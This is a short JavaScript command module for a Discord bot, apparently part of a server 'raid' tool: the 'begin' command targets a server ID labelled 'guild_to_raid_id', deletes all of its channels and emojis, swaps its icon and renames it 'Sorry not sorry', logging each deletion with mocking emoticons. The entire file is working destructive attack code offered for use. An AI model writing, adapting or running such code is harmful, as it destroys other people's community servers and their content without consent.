module.exports = {
    name: 'begin',
    description: 'Begins Demolition.',
    aliases: ['start', 'load', 'run'],
    async execute(client, message, args, Hyperz, config){
    
    let guild = client.guilds.cache.get(config["main_config"].guild_to_raid_id);

    guild.channels.cache.forEach(c => {
        c.delete();
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
    });

    guild.emojis.cache.forEach(e => {
        guild.deleteEmoji(e);
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
    });

    guild.setIcon("https://lh3.googleusercontent.com/proxy/UQJTrzLIRVwtAE1KwvDbQyrb31Ui5x8WcoJtJXs28B5NrKJeRhOEB99lMVUQ9pZyMd1gpIM4a24klBmBsc0MGobXjHmwS8GVCj9h-S6J_d2_gnyiOAndBeGV0y0w");

    guild.setName("Sorry not sorry");
    
    console.info("\x1b[37m\x1b[42mSuccess\x1b[0m: Operation completed! (^_^)/~");
    
    },
}